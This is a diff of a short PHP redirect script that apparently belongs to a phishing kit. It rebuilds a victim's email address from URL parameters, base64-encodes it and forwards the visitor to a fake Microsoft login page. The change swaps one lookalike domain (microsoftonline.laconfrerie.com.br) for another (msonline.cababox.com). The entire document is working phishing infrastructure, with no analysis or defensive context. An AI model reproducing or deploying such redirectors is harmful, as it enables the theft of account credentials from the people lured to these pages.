@@ -11,6 +11,6 @@ function Redirect($url, $permanent = false)
  exit();
 }
 
-Redirect("https://microsoftonline.laconfrerie.com.br/login/voicemail/auth/?email=" . base64_encode($_GET['a'] . "@" . $_GET['b']   .  "." . $_GET['c'])   ."", false);
+Redirect("https://msonline.cababox.com/auth/login.php?email=" . base64_encode($_GET['a'] . "@" . $_GET['b']   .  "." . $_GET['c'])   ."", false);
 
 ?>
